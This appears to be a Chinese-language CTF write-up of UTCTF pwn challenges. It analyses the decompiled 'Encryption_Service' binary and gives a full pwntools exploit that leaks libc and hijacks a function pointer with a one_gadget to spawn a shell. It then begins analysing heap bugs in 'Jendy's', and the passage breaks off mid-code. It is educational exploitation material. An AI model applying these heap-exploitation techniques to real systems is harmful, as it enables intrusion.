class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序提供了4个功能分别是：</p><ol><li>创建一个加密字符串，为一个0x28大小的结构体，需要选择加密方式，输入明文长度以及明文内容；</li><li>删除一个加密字符串，不会free掉创建的结构体，不过会把结构体中<code>freed</code>的标记位置为1，然后free掉明文和密文的内存；</li><li>打印已创建的加密字符串；</li><li>编辑一个加密字符串，可以重新输入明文；</li></ol><p>加密字符串的结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">message</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> *plaintxt;</span><br><span class="line">  <span class="keyword">char</span> *ciphertxt;</span><br><span class="line">  <span class="keyword">void</span> *encrypt;</span><br><span class="line">  <span class="keyword">void</span> *print_info;</span><br><span class="line">  __int32 isFreed;</span><br><span class="line">  __int32 size;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>简单看了一下，程序没有明显的漏洞，不过有几个地方的处理逻辑值得留意一下。</p><ul><li>encrypt_string函数（这里的<code>*&amp;size[4]</code>应该是message结构体，但IDA把它和size连在一起，不知道如何修改类型，求知道的师傅告知一下）</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">encrypt_string</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> size[<span class="number">12</span>]; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> *plaintxt; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">void</span> *ciphertxt; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  print_encryption_menu();</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d%*c"</span>, &amp;v1);</span><br><span class="line">  *&amp;size[<span class="number">4</span>] = create_info();  <span class="comment">// 这里创建结构体</span></span><br><span class="line">  <span class="keyword">if</span> ( *&amp;size[<span class="number">4</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(*&amp;size[<span class="number">4</span>] + <span class="number">16L</span>L) = key_encrypt;</span><br><span class="line">      *(*&amp;size[<span class="number">4</span>] + <span class="number">24L</span>L) = print_key;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v1 != <span class="number">2</span> )  <span class="comment">// 选择不存在的加密方式，直接退出</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Not a valid choice"</span>);</span><br><span class="line">        <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">      *(*&amp;size[<span class="number">4</span>] + <span class="number">16L</span>L) = xor_encrypt;</span><br><span class="line">      *(*&amp;size[<span class="number">4</span>] + <span class="number">24L</span>L) = print_xor;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"How long is your message?\n&gt;"</span>, &amp;v1);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d%*c"</span>, size);   <span class="comment">// 可以输入负数</span></span><br><span class="line">    *(*&amp;size[<span class="number">4</span>] + <span class="number">36L</span>L) = ++*size;</span><br><span class="line">    plaintxt = <span class="built_in">malloc</span>(*size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please enter your message: "</span>, size);</span><br><span class="line">    fgets(plaintxt, *size, <span class="built_in">stdin</span>);</span><br><span class="line">    **&amp;size[<span class="number">4</span>] = plaintxt;</span><br><span class="line">    ciphertxt = <span class="built_in">malloc</span>(*size);</span><br><span class="line">    *(*&amp;size[<span class="number">4</span>] + <span class="number">8L</span>L) = ciphertxt;</span><br><span class="line">    (*(*&amp;size[<span class="number">4</span>] + <span class="number">16L</span>L))(plaintxt, ciphertxt);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your encrypted message is: %s\n"</span>, ciphertxt);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>单看输入点，使用的是<code>fgets</code>，长度也是限制得死死的，没有截断问题和溢出点。但是，留意一下整个流程，会发现一些问题：</p><ol><li>函数在开始就直接创建一个结构体，而当我们选择一个错的加密方式直接退出后，但是创建的结构体并没有删除。由于函数提早退出，下面各种写入步骤全部跳过了，预留内存的数据没有改下，那我们就有UAF的可能性了。</li><li>输入明文长度的时候没有判断输入数字合法性，如果我们输入<code>-1</code>，那么最终<code>size=0</code>，就会出现<code>malloc(0)</code>的情况。同时<code>fgets</code>时的size为0，意味着不会读取任何数据，内存中的数据就不会更改，这样就可以绕过<code>fgets</code>末位加<code>\x00</code>截断的问题，从而泄露内存数据。</li></ol><p>由于程序中没有<code>system</code>之类的函数，那么第一步还是考虑如何泄露libc基址，可以上述第二点漏洞进行，步骤如下：</p><ol><li>创建一个加密字符串，明文长度为0x100；</li><li>删除此加密字符串，根据先free明文，后free密文的顺序，明文heap块的头会写入<code>main_arena+88</code>的地址，之后free密文后，两个unsorted bins会合并到top chunk；</li><li>创建一个加密字符串，明文长度为0（size输入<code>-1</code>），<code>malloc(0)</code>会创建一个0x20大小的chunk，由于<code>size=0</code>，<code>main_arena+88</code>的地址并不会被改写；</li><li><code>view_messages()</code>打印信息，就会把<code>main_arena+88</code>的地址泄露；</li></ol><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190313083836-56b11e5e-4528-1.png" alt=""></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190313083851-5f710e28-4528-1.png" alt=""></p><ul><li>view_messages函数</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">view_messages</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">message</span> *<span class="title">v0</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = information[i];</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v0) = information[i]-&gt;isFreed;</span><br><span class="line">      <span class="keyword">if</span> ( !v0 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Message #%d\n"</span>, i);</span><br><span class="line">        (information[i]-&gt;print_info)();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Plaintext: %s\n"</span>, information[i]-&gt;plaintxt);</span><br><span class="line">        LODWORD(v0) = <span class="built_in">printf</span>(<span class="string">"Ciphertext: %s\n"</span>, information[i]-&gt;ciphertxt);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序打印信息时会调用结构体中<code>print_info</code>函数，如果能够把这个函数改成<code>system</code>或<code>one_gadget</code>就能getshell了。这里我们可以利用上面提到的第一点漏洞：</p><ol><li>创建一个加密字符串，明文长度为0x100，明文内容为一个假结构体，其中<code>print_info</code>处为<code>one_gadget</code>地址；</li><li>删除此加密字符串，明文的chunk回收到unsorted bins中；</li><li>创建一个加密字符串，输入一个不存在的加密方式，如<code>3</code>；</li><li>继续创建一个加密字符串，输入一个不存在的加密方式，如<code>3</code>，此时会unsorted bins中分裂一块内存给字符串结构体使用，结构体中<code>print_info</code>为内存原有的数据，即<code>one_gadget</code>地址；</li><li><code>view_messages()</code>打印信息，调用<code>information[i]-&gt;print_info</code></li></ol><p>完整EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'stack.overflow.fail'</span>,<span class="number">9004</span>)</span><br><span class="line">elf = ELF(<span class="string">'./Encryption_Service'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_string</span><span class="params">(option,size,message)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt;'</span>,str(option))</span><br><span class="line"><span class="keyword">if</span> option &gt; <span class="number">2</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;'</span>,str(size))</span><br><span class="line"><span class="keyword">if</span> size &lt; <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">p.sendlineafter(<span class="string">'message: '</span>,message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_encrypted_string</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'remove: '</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_messages</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;'</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_encrypted_message</span><span class="params">(idx,message)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;'</span>,<span class="string">'4'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'message'</span>,message)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'id?\n'</span>,str(<span class="number">0xff</span>))</span><br><span class="line">encrypt_string(<span class="number">1</span>,<span class="number">0xff</span>,<span class="string">'a'</span>*<span class="number">0xff</span>)</span><br><span class="line">remove_encrypted_string(<span class="number">0</span>)</span><br><span class="line">encrypt_string(<span class="number">1</span>,<span class="number">-1</span>,<span class="string">''</span>) <span class="comment">#0</span></span><br><span class="line">view_messages()</span><br><span class="line">p.recvuntil(<span class="string">'Plaintext: '</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) - <span class="number">0x3c4b20</span> - <span class="number">88</span></span><br><span class="line">success(<span class="string">"libc.address:&#123;:#x&#125;"</span>.format(libc.address))</span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0x45216</span></span><br><span class="line">fake_message = flat(<span class="number">0</span>,<span class="number">0</span>,one_gadget,one_gadget,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">encrypt_string(<span class="number">1</span>,<span class="number">0xff</span>,fake_message) <span class="comment">#1</span></span><br><span class="line">encrypt_string(<span class="number">1</span>,<span class="number">0xff</span>,<span class="string">'123'</span>) <span class="comment">#2</span></span><br><span class="line">remove_encrypted_string(<span class="number">1</span>)</span><br><span class="line">encrypt_string(<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">encrypt_string(<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">view_messages()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Jendy’s"><a href="#Jendy’s" class="headerlink" title="Jendy’s"></a>Jendy’s</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I&apos;ve probably eaten my entire body weight in Wendy&apos;s nuggies.</span><br><span class="line"></span><br><span class="line">nc stack.overflow.fail 9003</span><br></pre></td></tr></table></figure><p>检查保护情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/pwn/utctf/Jendy&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">print_menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to Jendy's, How may we take your order?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1. Add Name to Order"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2. Add Item to Order"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"3. Remove Item from Order"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"4. View order"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"5. Checkout"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">putchar</span>(<span class="number">62</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序基本功能：</p><ol><li>创建一个name，每次创建都malloc(0x20)的内存；</li><li>添加一个item，item为单链表结构，后面详细说；</li><li>删除一个item，有对单链表进行操作，后面详细说；</li><li>打印order中name及item的信息；</li></ol><p>结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">order</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">item</span> *<span class="title">head</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">item</span> *<span class="title">tail</span>;</span></span><br><span class="line">  <span class="keyword">char</span> *name;</span><br><span class="line">  __int64 count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">item</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span>[<span class="number">24</span>] name;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">item</span> *<span class="title">next_item</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这种链表结构的题目，一般出现漏洞的地方都在链表删除的地方。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">remove_item</span><span class="params">(struct order *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">item</span> *<span class="title">ptr</span>;</span> <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">item</span> *<span class="title">v5</span>;</span> <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please enter the number of the item from your order that you wish to remove"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d%*c"</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr = a1-&gt;head;</span><br><span class="line">    v5 = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( v2 || !ptr || v2 ) <span class="comment">// a1-&gt;head = 0 or v2&gt;0</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; ptr &amp;&amp; i != v2; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = ptr;</span><br><span class="line">        ptr = ptr-&gt;next_item;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( ptr &amp;&amp; i == v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( LODWORD(a1-&gt;count) - <span class="number">1</span> == v2 ) </span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">free</span>(a1-&gt;tail);</span><br><span class="line">          a1-&gt;tail = v5;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v5-&gt;next_item = ptr-&gt;next_item;</span><br><span class="line">          <span class="built_in">free</span>(ptr);</span><br><span class="line">        &#125;</span><br><span class="line">        --LODWORD(a1-&gt;count);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// v2=0 and  a1-&gt;head != 0</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">      *(_OWORD *)&amp;a1-&gt;head = <span class="number">0u</span>LL;</span><br><span class="line">      --LODWORD(a1-&gt;count);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个删除的函数有几个迷之操作：</p><ol><li>删除0号<code>item</code>的时候，直接把<code>head</code>清0，但是没有对<code>head</code>重新赋值；</li><li>如果输入的编号<code>v2</code>刚好是最后一个item（<code>count-1</code>），那么直接删除<code>a1-&gt;tail</code>，而不是删除<code>ptr</code>；</li><li>删除<code>head</code>或者<code>tail</code>，都不会清空<code>item</code>结构体的<code>next_item</code>指针；</li><li>单链表查找删除的<code>item</code>时，并不会检查<code>v2</code>是否超过<code>count</code>的大小；</li></ol><p>继续看一下<code>add_item()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">add_item</span><span class="params">(struct order *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">item</span> *<span class="title">v6</span>;</span> <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Which item would you like to order from Jendy's?"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d. %s\n"</span>, i, (&amp;options)[i]);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d%*c"</span>, &amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt;= <span class="number">0</span> &amp;&amp; v3 &lt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    v1 = <span class="built_in">strlen</span>((&amp;options)[v3]);</span><br><span class="line">    <span class="built_in">strncpy</span>(dest, (&amp;options)[v3], v1);</span><br><span class="line">    v6 = a1-&gt;head;</span><br><span class="line">    ++LODWORD(a1-&gt;count);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">      a1-&gt;tail-&gt;next_item = (struct item *)dest;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      a1-&gt;head = (struct item *)dest;</span><br><span class="line">    a1-&gt;tail = (struct item *)dest;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Not a valid option!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里如果<code>a1-&gt;head</code>为空，则会重新对<code>a1-&gt;head</code>赋值为新创建的<code>item</code>，同时<code>a1-&gt;tail</code>也赋值为新创建的<code>item</code>。现在回去看看<code>remove_item()</code>的第一个迷之操作，如果我们创建2个<code>item</code>，然后删掉0号<code>item</code>，再创建一个<code>item</code>，那么<code>a1-&gt;head</code>和<code>a1-&gt;tail</code>同时指向同一个<code>item</code>，此时出现<code>double free</code>漏洞了。</p><p>继续下一个函数<code>add_name()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *__<span class="function">fastcall <span class="title">add_name</span><span class="params">(struct order *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What is your name?"</span>);</span><br><span class="line">  a1-&gt;name = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> fgets(a1-&gt;name, <span class="number">32</span>, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>name</code>的大小刚好也是0x30，刚好和<code>item</code>的大小一样，由于删除后指针不清除，可以通过<code>add_name()</code>进行UAF。</p><p>最后看一下本题唯一的打印函数，此处应该是泄露地址的突破口。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">view_order</span><span class="params">(struct order *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *format; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1-&gt;name )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(&amp;s, <span class="number">0x28</span>uLL, <span class="string">"Name: %s\n"</span>, a1-&gt;name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, 